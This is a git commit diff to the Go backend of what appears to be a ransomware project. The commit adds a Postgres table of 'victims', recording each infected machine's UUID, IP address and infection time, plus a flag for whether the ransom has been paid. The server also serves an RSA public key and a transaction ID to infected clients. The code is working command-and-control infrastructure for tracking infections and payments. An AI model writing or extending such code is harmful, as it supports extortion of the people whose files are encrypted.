61a5590dec71f2bec56560c862ee528faaa77bcb
nireo <eemil.lehtikangas1@gmail.com>
2021-01-23 13:54:54 +0200

    added victim information to the database

--- server/server.go
+++ server/server.go
@@ -1,4 +1,4 @@
-package server
+package main
 
 import (
 	"encoding/json"
@@ -6,7 +6,14 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
+
+	"github.com/joho/godotenv"
+	"gorm.io/driver/postgres"
+	"gorm.io/gorm"
 )
+
+var db *gorm.DB
 
 func GiveTransactionID(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("your transaction id"))
@@ -22,10 +29,18 @@ func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
 	w.Write(data)
 }
 
-type newVictim struct {
+type Victim struct {
+	gorm.Model
 	UUID      string `json:"uuid"` // A unique id used to identify the victim
 	IP        string `json:"ip"`
 	Timestamp int64  `json:"timestamp"` // A timestamp of the infection
+	Completed bool   `json:"completed"` // A indicator if the transaction has been payed.
+}
+
+type newVictim struct {
+	UUID      string `json:"uuid"`
+	IP        string `json:"ip"`
+	Timestamp int64  `json:"timestamp"`
 }
 
 func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
@@ -34,6 +49,13 @@ func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	if r.Header.Get("Content-Type") != "application/json" {
+		http.Error(w, fmt.Sprintf("wrong content type, wanted: application/json, got: %s",
+			r.Header.Get("Content-Type")), http.StatusBadRequest)
+		return
+	}
+
+	// parse json data from the request
 	var victimData newVictim
 	if err := json.NewDecoder(r.Body).Decode(&victimData); err != nil {
 		http.Error(w, fmt.Sprintf("could not parse request body json data: %s", err),
@@ -41,15 +63,44 @@ func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// TODO: store victim data in a database.
-	fmt.Println(victimData.IP)
-	fmt.Println(victimData.UUID)
-	fmt.Println(victimData.Timestamp)
+	// The uuid is created on the client-side, since then the client also easily knows
+	// its own uuid.
 
+	victim := &Victim{
+		UUID:      victimData.UUID,
+		Timestamp: victimData.Timestamp,
+		IP:        victimData.IP,
+		Completed: false,
+	}
+
+	db.Create(victim)
 	w.WriteHeader(http.StatusOK)
 }
 
 func main() {
+	// Load environment variables, such that we can take database parameters
+	if err := godotenv.Load(); err != nil {
+		log.Fatalf("could not load environment variables: %s", err)
+	}
+
+	dbHost := os.Getenv("db_host")
+	dbPort := os.Getenv("db_port")
+	dbUser := os.Getenv("db_user")
+	dbName := os.Getenv("db_name")
+
+	var err error
+	db, err = gorm.Open(postgres.New(postgres.Config{
+		DSN: fmt.Sprintf("host=%s port=%s user=%s dbname=%s sslmode=disable",
+			dbHost, dbPort, dbUser, dbName),
+	}), &gorm.Config{})
+
+	if err != nil {
+		log.Fatalf("could not establish a database connection: %s", err)
+	}
+
+	// always migrate the victim model
+	db.AutoMigrate(&Victim{})
+
 	http.HandleFunc("/get_transaction", GiveTransactionID)
 	http.HandleFunc("/pubkey", GetRSAPubKey)
 	http.HandleFunc("/register", RegisterNewVictim)
